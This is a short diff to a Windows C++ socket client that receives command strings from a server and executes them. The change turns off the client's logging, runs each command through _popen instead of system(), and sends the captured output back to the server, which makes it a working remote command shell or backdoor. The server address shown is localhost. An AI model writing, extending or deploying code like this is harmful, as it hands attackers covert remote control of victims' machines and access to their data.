@@ -11,12 +11,12 @@
 
 #define SERVER_IP "127.0.0.1"
 
-#define LOG 1
-
+#define LOG 0
 
 
 void execute_command_from_server(const SOCKET& connection, const sockaddr_in& server) {
-	char recvbuf[BUF_LEN + 1] = { 0 };
+	char recvbuf[BUF_LEN]; ZeroMemory(recvbuf, BUF_LEN);
+	std::string result;
 
 	int bytes = recv(connection, recvbuf, BUF_LEN, 0);
 
@@ -24,7 +24,15 @@ void execute_command_from_server(const SOCKET& connection, const sockaddr_in& se
 	std::cout << "--BEGIN MESSAGE--\n\t" << recvbuf << "\n--END MESSAGE--\n";
 	#endif
 
-	system(recvbuf);
+	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(recvbuf, "r"), _pclose);
+
+	while (fgets(recvbuf, BUF_LEN, pipe.get()) != nullptr) {
+		result += recvbuf;
+		ZeroMemory(recvbuf, BUF_LEN);
+	}
+
+	// write result back
+	send(connection, result.data(), result.length(), 0);
 }
 
 int main() {
